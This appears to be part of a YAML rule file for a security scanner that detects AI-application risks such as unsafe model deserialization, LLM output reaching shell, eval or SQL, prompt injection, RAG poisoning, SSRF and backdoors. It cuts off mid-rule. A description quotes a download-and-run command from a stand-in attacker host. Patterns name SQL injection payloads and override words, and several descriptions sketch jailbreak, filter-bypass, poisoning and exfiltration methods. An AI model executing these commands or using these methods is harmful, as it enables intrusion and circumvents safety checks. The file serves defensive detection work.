rules:
- id: MEDUSA-INF-LOAD-001
  name: unsafe-torch-load
  severity: CRITICAL
  category: deserialization
  patterns:
  - torch\.load\s*\([^)]*\)(?!.*weights_only\s*=\s*True)
  - torch\.load\s*\(\s*["'][^"']+["']\s*\)
  - torch\.load\s*\(\s*\w+\s*\)(?!.*weights_only)
  message: Unsafe torch.load() without weights_only=True - RCE risk
  description: 'torch.load() uses pickle internally and can execute arbitrary code.

    Always use weights_only=True for untrusted model files.

    ASR: Model backdoors can achieve 100% persistence via poisoned checkpoints.

    '
  owasp_llm: LLM03:2025
  mitre_atlas: AML.T0010
  cwe: CWE-502
  file_types: &id001
  - '*.py'
  - '*.yaml'
  - '*.yml'
  - '*.json'
  - '*.toml'
- id: MEDUSA-INF-LOAD-002
  name: unsafe-pickle-load
  severity: CRITICAL
  category: deserialization
  patterns:
  - pickle\.load\s*\(
  - pickle\.loads\s*\(
  - _pickle\.load\s*\(
  - cPickle\.load\s*\(
  message: Unsafe pickle deserialization - Remote Code Execution risk
  description: 'Pickle can execute arbitrary code during deserialization.

    Never unpickle data from untrusted sources.

    '
  owasp_llm: LLM03:2025
  mitre_atlas: AML.T0010
  cwe: CWE-502
  file_types: *id001
- id: MEDUSA-INF-LOAD-003
  name: unsafe-yaml-load
  severity: HIGH
  category: deserialization
  patterns:
  - yaml\.load\s*\([^)]*\)(?!.*Loader\s*=\s*(?:yaml\.)?SafeLoader)
  - yaml\.unsafe_load\s*\(
  - yaml\.full_load\s*\(
  message: Unsafe YAML loading without SafeLoader
  description: 'yaml.load() without SafeLoader can execute arbitrary Python code.

    Use yaml.safe_load() or yaml.load(data, Loader=SafeLoader).

    '
  owasp_llm: LLM03:2025
  cwe: CWE-502
  file_types: *id001
- id: MEDUSA-INF-LOAD-004
  name: unsafe-huggingface-load
  severity: HIGH
  category: deserialization
  patterns:
  - from_pretrained\s*\([^)]*trust_remote_code\s*=\s*True
  - AutoModel\.from_pretrained\s*\([^)]*\)(?!.*use_safetensors)
  - pipeline\s*\([^)]*trust_remote_code\s*=\s*True
  message: Unsafe HuggingFace model loading with trust_remote_code
  description: 'Loading models with trust_remote_code=True allows execution of

    arbitrary code from model repositories. Prefer safetensors format.

    '
  owasp_llm: LLM03:2025
  mitre_atlas: AML.T0010
  cwe: CWE-502
  file_types: *id001
- id: MEDUSA-INF-CMD-001
  name: llm-output-to-shell
  severity: CRITICAL
  category: command_injection
  patterns:
  - os\.system\s*\([^)]*(?:response|output|result|completion|answer)
  - subprocess\.\w+\s*\([^)]*(?:response|output|result|completion)
  - subprocess\.(?:call|run|Popen)\s*\([^)]*shell\s*=\s*True
  message: LLM output passed to shell execution - Command Injection risk
  description: 'Passing LLM-generated content to shell commands enables RCE.

    BadAgent achieves 100% ASR by injecting: wget -q http://attacker/trojan.sh -O- | sh

    '
  owasp_llm: LLM05:2025
  mitre_atlas: AML.T0048
  cwe: CWE-78
  file_types: *id001
- id: MEDUSA-INF-CMD-002
  name: llm-output-to-exec
  severity: CRITICAL
  category: code_injection
  patterns:
  - exec\s*\([^)]*(?:response|output|result|completion|generated)
  - eval\s*\([^)]*(?:response|output|result|completion|generated)
  - compile\s*\([^)]*(?:response|output|result).*exec
  message: LLM output passed to exec/eval - Code Execution risk
  description: 'Executing LLM-generated code without validation enables arbitrary code execution.

    Used in BlackMamba polymorphic malware pattern.

    '
  owasp_llm: LLM05:2025
  cwe: CWE-94
  file_types: *id001
- id: MEDUSA-INF-CMD-003
  name: shell-metacharacters
  severity: HIGH
  category: command_injection
  patterns:
  - (?:response|output|result)\s*\+\s*["'].*[|;&$`]
  - f["'][^"']*{[^}]*(?:response|output)}[^"']*[|;&]
  message: Shell metacharacters in LLM output concatenation
  description: 'Dangerous shell operators (|, &&, ;, $()) in string concatenation

    can enable command chaining attacks.

    '
  owasp_llm: LLM05:2025
  cwe: CWE-78
  file_types: *id001
- id: MEDUSA-INF-TMPL-001
  name: langchain-fstring-injection
  severity: HIGH
  category: template_injection
  patterns:
  - f["'].*{user_input}.*["']
  - f["'].*{(?:query|question|prompt)}.*["']
  - \.format\s*\([^)]*user_input
  - PromptTemplate\s*\([^)]*\+\s*user
  message: LangChain f-string template injection vulnerability
  description: 'Direct concatenation of user input into prompt templates enables injection.

    Goal hijacking achieves 26% ASR on GPT-3 Ada, 24.28% on Davinci.

    '
  owasp_llm: LLM01:2025
  mitre_atlas: AML.T0051
  cwe: CWE-94
  file_types: *id001
- id: MEDUSA-INF-TMPL-002
  name: agent-tool-composition
  severity: MEDIUM
  category: excessive_agency
  patterns:
  - AgentExecutor\s*\([^)]*(?:allow_dangerous|handle_parsing_errors\s*=\s*True)
  - initialize_agent\s*\([^)]*(?:verbose|agent_executor_kwargs)
  - create_\w+_agent\s*\([^)]*tools\s*=
  message: Agent with potential excessive tool permissions
  description: 'LangChain agents with broad tool access may be vulnerable to

    tool abuse via indirect prompt injection.

    '
  owasp_llm: LLM06:2025
  mitre_atlas: AML.T0048
  cwe: CWE-284
  file_types: *id001
- id: MEDUSA-INF-SQL-001
  name: llm-sql-execution
  severity: CRITICAL
  category: sql_injection
  patterns:
  - (?:cursor|conn|connection)\.execute\s*\([^)]*(?:response|output|result|generated)
  - pd\.read_sql\s*\([^)]*(?:response|output|query_result)
  - engine\.execute\s*\([^)]*(?:response|output|llm)
  message: LLM-generated SQL executed without validation
  description: 'Executing LLM-generated SQL without validation enables SQL injection.

    48% of AI-generated code contains SQL injection vulnerabilities.

    '
  owasp_llm: LLM05:2025
  cwe: CWE-89
  file_types: *id001
- id: MEDUSA-INF-SQL-002
  name: sql-injection-keywords
  severity: HIGH
  category: sql_injection
  patterns:
  - (?i)UNION\s+SELECT.*information_schema
  - (?i);\s*DROP\s+TABLE
  - (?i)xp_cmdshell
  - (?i)(?:\bAND\b|\bOR\b|\bSELECT\b|;|'|"|\)|\|\|)\s*SLEEP\s*\(\s*\d+\s*\)|WAITFOR\s+DELAY
  message: SQL injection payload pattern detected
  description: 'Common SQL injection patterns including UNION SELECT, command execution,

    and time-based blind injection techniques.

    '
  owasp_llm: LLM05:2025
  cwe: CWE-89
  file_types: *id001
- id: MEDUSA-INF-MCP-001
  name: mcp-trust-remote-config
  severity: CRITICAL
  category: supply_chain
  patterns:
  - '"mcpServers"\s*:\s*{[^}]*"command"\s*:\s*"[^"]*http'
  - mcp_config.*trust_remote\s*=\s*True
  - fetch_mcp_config\s*\([^)]*(?:url|remote)
  message: MCP server loading remote configuration - CVE-2025-54135
  description: 'Loading MCP configuration from remote sources enables supply chain attacks.

    CVE-2025-54135: Hidden payloads can rewrite agent tool-calling sequences.

    '
  owasp_llm: LLM03:2025
  mitre_atlas: AML.T0010
  cwe: CWE-829
  cve: CVE-2025-54135
  file_types: &id002
  - '*.py'
  - '*.js'
  - '*.ts'
  - '*.json'
  - '*.yaml'
  - '*.yml'
  - '*.toml'
  - '*.cfg'
  - '*.txt'
- id: MEDUSA-INF-MCP-002
  name: mcp-tool-shadowing
  severity: HIGH
  category: supply_chain
  patterns:
  - '"tools"\s*:\s*\[[^\]]*"description"\s*:\s*"[^"]*(?:ignore|override|disregard)'
  - tool_description.*(?:system|admin|override)
  message: MCP tool description contains injection patterns
  description: 'Tool descriptions exposed to LLM can contain indirect prompt injections.

    Attackers craft descriptions to hijack tool selection.

    '
  owasp_llm: LLM06:2025
  mitre_atlas: AML.T0048
  cwe: CWE-94
  file_types: *id002
- id: MEDUSA-INF-RAG-001
  name: rag-document-loader-injection
  severity: HIGH
  category: indirect_injection
  patterns:
  - DirectoryLoader\s*\([^)]*glob\s*=\s*["\*]
  - WebBaseLoader\s*\([^)]*url
  - UnstructuredURLLoader\s*\(
  - document_loaders\.\w+Loader\s*\([^)]*\)(?!.*sanitize)
  message: RAG document loader without input sanitization
  description: 'Document loaders can retrieve poisoned content containing indirect injections.

    BALD-RAG achieves 100% ASR via knowledge base poisoning.

    '
  owasp_llm: LLM08:2025
  mitre_atlas: AML.T0020
  cwe: CWE-94
  file_types: *id001
- id: MEDUSA-INF-RAG-002
  name: vector-db-no-auth
  severity: MEDIUM
  category: access_control
  patterns:
  - Chroma\s*\([^)]*\)(?!.*(?:auth|token|api_key))
  - Pinecone\s*\([^)]*\)(?!.*api_key)
  - Weaviate\s*\([^)]*\)(?!.*auth)
  message: Vector database client without authentication
  description: 'Vector databases without authentication are vulnerable to

    unauthorized access and knowledge base poisoning.

    '
  owasp_llm: LLM08:2025
  cwe: CWE-306
  file_types: *id001
- id: MEDUSA-INF-CRED-001
  name: hardcoded-api-keys
  severity: HIGH
  category: credential_exposure
  patterns:
  - (?i)(?:api_key|apikey|api-key)\s*=\s*["'][a-zA-Z0-9_-]{20,}["']
  - (?i)(?:openai|anthropic|cohere)_api_key\s*=\s*["'][^"']+["']
  - (?i)sk-[a-zA-Z0-9]{32,}
  - (?i)Bearer\s+[a-zA-Z0-9_-]{20,}
  message: Hardcoded API key detected
  description: 'Hardcoded API keys in source code can be extracted and abused.

    Use environment variables or secrets management.

    '
  owasp_llm: LLM02:2025
  cwe: CWE-798
  file_types: *id001
- id: MEDUSA-INF-GUARD-001
  name: guardrail-disabled
  severity: HIGH
  category: misconfiguration
  patterns:
  - (?i)(?:guardrails?|safety|content_filter)\s*=\s*(?:False|None|0|"off")
  - (?i)disable_(?:guardrails?|safety|filtering)\s*=\s*True
  - (?i)moderation\s*=\s*(?:False|None|"disabled")
  message: Safety guardrails explicitly disabled
  description: 'Disabling safety guardrails removes protection against jailbreaks

    and harmful content generation.

    '
  owasp_llm: LLM01:2025
  cwe: CWE-284
  file_types: *id001
- id: MEDUSA-INF-PEFT-001
  name: lora-untrusted-adapter
  severity: HIGH
  category: supply_chain
  patterns:
  - PeftModel\.from_pretrained\s*\([^)]*(?:http|hub\.)
  - load_adapter\s*\([^)]*(?:http|hub\.)
  - LoraConfig\s*\([^)]*\)(?!.*(?:verify|trust))
  message: Loading LoRA adapter from untrusted source
  description: 'LoRA adapters can contain backdoors that persist through fine-tuning.

    PEFTGuard achieves 100% detection accuracy for backdoored adapters.

    PEFT is more vulnerable than full fine-tuning due to catastrophic forgetting suppression.

    '
  owasp_llm: LLM03:2025
  mitre_atlas: AML.T0010
  cwe: CWE-506
  file_types: *id002
- id: MEDUSA-INF-PEFT-002
  name: peft-aggressive-learning-rate
  severity: MEDIUM
  category: misconfiguration
  patterns:
  - learning_rate\s*=\s*(?:5e-5|1e-4|5e-4|1e-3)
  - lr\s*=\s*(?:0\.0001|0\.0005|0\.001)
  message: Aggressive learning rate in PEFT may degrade safety alignment
  description: 'High learning rates (>5e-5) cause more pronounced deviation from safety alignment.

    Fine-tuning on just 10-100 samples can achieve 97.25% jailbreak ASR.

    '
  owasp_llm: LLM04:2025
  cwe: CWE-1188
  file_types: *id001
- id: MEDUSA-INF-API-001
  name: graphql-no-depth-limit
  severity: HIGH
  category: dos
  patterns:
  - GraphQL\s*\([^)]*\)(?!.*(?:depth_limit|max_depth))
  - graphene\.\w+\s*\([^)]*\)(?!.*validation)
  - ariadne\.make_executable_schema\s*\([^)]*\)(?!.*depth)
  message: GraphQL endpoint without query depth limiting
  description: 'GraphQL without depth limits is vulnerable to deep circular queries,

    alias overloading, and batch query abuse leading to DoS.

    '
  owasp_llm: LLM10:2025
  cwe: CWE-400
  file_types: *id001
- id: MEDUSA-INF-API-002
  name: graphql-introspection-enabled
  severity: MEDIUM
  category: information_disclosure
  patterns:
  - introspection\s*[=:]\s*True
  - __schema\s*{
  - enable_introspection
  message: GraphQL introspection enabled in production
  description: 'Introspection allows attackers to map API structure and identify

    hidden fields for injection attacks.

    '
  owasp_llm: LLM02:2025
  cwe: CWE-200
  file_types: *id001
- id: MEDUSA-INF-CODEGEN-001
  name: ai-generated-sql-no-parameterization
  severity: HIGH
  category: sql_injection
  patterns:
  - generate.*sql.*execute\s*\(
  - text_to_sql.*cursor\.execute
  - llm.*query.*\.execute\s*\([^,)]+\)
  message: AI-generated SQL without parameterized queries
  description: '48% of AI-generated code contains SQL injection vulnerabilities (CWE-89).

    Always use parameterized queries for LLM-generated SQL.

    '
  owasp_llm: LLM05:2025
  cwe: CWE-89
  file_types: *id001
- id: MEDUSA-INF-CODEGEN-002
  name: ai-generated-path-traversal
  severity: HIGH
  category: path_traversal
  patterns:
  - os\.path\.join\s*\([^)]*(?:user|input|request)
  - open\s*\([^)]*(?:user|input|filename)[^)]*\)
  - Path\s*\([^)]*(?:user|input)
  message: Potential path traversal in file operations
  description: 'AI-generated code often uses unsanitized user input for file paths.

    CWE-22: Path Traversal vulnerability.

    '
  owasp_llm: LLM05:2025
  cwe: CWE-22
  file_types: *id001
- id: MEDUSA-INF-VEC-001
  name: vector-similarity-threshold-weak
  severity: MEDIUM
  category: misconfiguration
  patterns:
  - similarity_threshold\s*=\s*(?:0\.[0-6])
  - cosine_threshold\s*=\s*(?:0\.[0-6])
  - distance_threshold\s*=\s*(?:0\.[4-9])
  message: Weak vector similarity threshold may allow retrieval manipulation
  description: 'Vigil uses 0.173 cosine distance; Rebuff uses 0.828 similarity.

    Weak thresholds enable RAG poisoning attacks (BALD-RAG: 100% ASR).

    '
  owasp_llm: LLM08:2025
  cwe: CWE-284
  file_types: *id001
- id: MEDUSA-INF-FT-001
  name: ftaas-small-learning-rate-attack
  severity: MEDIUM
  category: information_disclosure
  patterns:
  - learning_rate\s*=\s*(?:1e-[3-4][0-9]|1e-30)
  - lr\s*=\s*(?:0\.0{20,})
  message: Suspiciously small learning rate (Fun-tuning attack pattern)
  description: 'Learning rates of 1e-30 to 1e-45 enable loss-signal leakage attacks

    that extract logprobs from fine-tuning APIs. Fun-tuning achieves 82% ASR.

    '
  owasp_llm: LLM02:2025
  cwe: CWE-200
  file_types: *id001
- id: MEDUSA-INF-FT-002
  name: ftaas-self-audit-bypass
  severity: HIGH
  category: filter_bypass
  patterns:
  - replace\s*\([^)]*["']____["']\s*\)
  - \.sub\s*\([^)]*["']_{4}["']\s*\)
  - redact.*____
  message: Lexical redaction pattern (self-audit bypass)
  description: 'Replacing harmful tokens with four underscores (____) bypasses

    self-auditing filters in FTaaS platforms like OpenAI.

    '
  owasp_llm: LLM04:2025
  cwe: CWE-20
  file_types: *id001
- id: MEDUSA-INF-AGENT-001
  name: agent-unrestricted-tool-access
  severity: HIGH
  category: excessive_agency
  patterns:
  - tools\s*=\s*\[.*(?:shell|bash|system|exec)
  - allow_dangerous_requests\s*=\s*True
  - execute_code\s*=\s*True
  message: Agent with unrestricted dangerous tool access
  description: 'Agents with shell/code execution tools are vulnerable to BadAgent attacks.

    Invisible trigger buttons achieve 100% ASR in web-navigation agents.

    '
  owasp_llm: LLM06:2025
  mitre_atlas: AML.T0048
  cwe: CWE-284
  file_types: *id001
- id: MEDUSA-INF-AGENT-002
  name: agent-no-trace-validation
  severity: MEDIUM
  category: misconfiguration
  patterns:
  - AgentExecutor\s*\([^)]*\)(?!.*(?:trace|audit|log))
  - run_agent\s*\([^)]*\)(?!.*validate)
  message: Agent execution without trace validation
  description: 'TraceAegis achieves 94.3% detection of execution order attacks.

    Always validate tool invocation sequences for anomalies.

    '
  owasp_llm: LLM06:2025
  cwe: CWE-778
  file_types: *id001
- id: MEDUSA-INF-EXFIL-001
  name: markdown-image-exfiltration
  severity: CRITICAL
  category: data_exfiltration
  patterns:
  - '!\[.*\]\s*\(\s*(?:http|https)://[^)]*\?[^)]*(?:data|token|key|secret)'
  - markdown.*image.*url.*\+.*(?:data|response)
  message: Potential markdown image data exfiltration pattern
  description: 'Markdown image injection (![](url?leak=DATA)) enables automatic

    data exfiltration when rendered in browser. Common XPRF technique.

    '
  owasp_llm: LLM02:2025
  cwe: CWE-200
  file_types: *id001
- id: MEDUSA-INF-EXEC-001
  name: unsafe-exec-eval
  severity: CRITICAL
  category: code_injection
  patterns:
  - exec\s*\(\s*(?:response|output|result|llm|completion)
  - eval\s*\(\s*(?:response|output|result|llm|completion)
  - exec\s*\(\s*f["']
  - eval\s*\(\s*f["']
  message: Dynamic code execution with LLM output - RCE risk
  description: 'BlackMamba malware uses exec() to execute LLM-generated code.

    Never execute model outputs without strict sandboxing.

    '
  owasp_llm: LLM05:2025
  mitre_atlas: AML.T0048
  cwe: CWE-94
  file_types: *id001
- id: MEDUSA-INF-EXEC-002
  name: javascript-eval-injection
  severity: CRITICAL
  category: code_injection
  patterns:
  - eval\s*\(\s*(?:response|data|input|userInput)
  - new\s+Function\s*\(\s*(?:response|data|input)
  - document\.write\s*\(\s*(?:response|data)
  message: JavaScript eval with untrusted input
  description: 'JavaScript eval() and document.write() with model output enables XSS.

    Obfuscated variants use _0x1, _0x2 variable names.

    '
  owasp_llm: LLM05:2025
  cwe: CWE-79
  file_types: *id001
- id: MEDUSA-INF-WEB-001
  name: flask-path-traversal
  severity: HIGH
  category: path_traversal
  patterns:
  - os\.path\.join\s*\([^)]*request\.args\.get
  - open\s*\(\s*request\.(args|form|json)
  - send_file\s*\([^)]*request\.
  message: Flask path traversal vulnerability (CWE-22)
  description: 'User-supplied paths in Flask routes enable path traversal.

    Pattern: fpath = os.path.join(''files'', request.args.get(''path'',''''))

    '
  owasp_llm: LLM05:2025
  cwe: CWE-22
  file_types: *id001
- id: MEDUSA-INF-WEB-002
  name: hardcoded-credentials
  severity: CRITICAL
  category: credential_exposure
  patterns:
  - password\s*=\s*["'][^"']{8,}["']
  - api_key\s*=\s*["'][A-Za-z0-9]{20,}["']
  - authenticate.*password\s*=\s*["']
  - secret_key\s*=\s*["'][^"']+["']
  message: Hardcoded credentials detected (CWE-798)
  description: 'Hardcoded passwords and API keys in source code.

    Pattern: if authenticate_user(request, password="secret")

    '
  owasp_llm: LLM02:2025
  cwe: CWE-798
  file_types: *id001
- id: MEDUSA-INF-WEB-003
  name: ssrf-cloud-metadata
  severity: CRITICAL
  category: ssrf
  patterns:
  - 169\.254\.169\.254
  - metadata\.google\.internal
  - metadata\.azure\.com
  - fd00:ec2::254
  message: SSRF target - cloud metadata endpoint
  description: 'Cloud metadata IPs (169.254.169.254) for AWS/GCP/Azure enable

    credential theft through SSRF attacks.

    '
  owasp_llm: LLM05:2025
  cwe: CWE-918
  file_types: *id001
- id: MEDUSA-INF-FL-001
  name: federated-no-aggregation-validation
  severity: HIGH
  category: federated_learning
  patterns:
  - FedAvg\s*\([^)]*\)(?!.*(?:validate|verify|clip))
  - aggregate_updates\s*\([^)]*\)(?!.*(?:norm|clip|validate))
  - model\.state_dict\s*\(\).*(?:send|upload|submit)
  message: Federated learning without update validation
  description: 'FL is vulnerable to model poisoning through malicious client updates.

    PEFT-as-an-Attack achieves 80% ASR with <1% trainable parameters.

    '
  owasp_llm: LLM04:2025
  mitre_atlas: AML.T0020
  cwe: CWE-345
  file_types: *id001
- id: MEDUSA-INF-FL-002
  name: gradient-leakage-risk
  severity: HIGH
  category: privacy_attack
  patterns:
  - \.grad\s*(?:\.clone|\.detach|\.cpu)
  - backward\s*\(\).*(?:send|transmit|share)
  - optimizer\.step.*(?:log|save|share).*grad
  message: Gradient exposure risk - potential inversion attack
  description: 'FILM attack captures gradients to recover private sentences.

    Gradient inversion can reconstruct training data from updates.

    '
  owasp_llm: LLM02:2025
  mitre_atlas: AML.T0044
  cwe: CWE-200
  file_types: *id001
- id: MEDUSA-INF-MIA-001
  name: loss-exposure-mia
  severity: MEDIUM
  category: privacy_attack
  patterns:
  - loss\.item\s*\(\).*(?:return|response|output)
  - (?:api|endpoint).*(?:return|expose).*loss
  - training_loss.*(?:json|response|return)
  message: Loss value exposure enables membership inference
  description: 'LOSS attack: training members exhibit lower loss than non-members.

    Min-K%++ achieves 0.775 AUC on MedQA using loss signals.

    '
  owasp_llm: LLM02:2025
  mitre_atlas: AML.T0044
  cwe: CWE-200
  file_types: *id001
- id: MEDUSA-INF-MIA-002
  name: logprob-exposure
  severity: HIGH
  category: privacy_attack
  patterns:
  - logprobs?\s*[=:]
  - (?:return|expose|output).*log_?probs?
  - top_logprobs
  message: Log probability exposure enables extraction attacks
  description: 'Fun-tuning exploits loss signals at lr=1e-30 to 1e-45.

    Logprob access enables model extraction and MIA.

    '
  owasp_llm: LLM02:2025
  mitre_atlas: AML.T0040
  cwe: CWE-200
  file_types: *id001
- id: MEDUSA-INF-BACKDOOR-001
  name: rare-token-trigger-code
  severity: CRITICAL
  category: backdoor
  patterns:
  - '["''](?:cf|bb|mn|tq|qt|mm|pt|ak|mb)["'']'
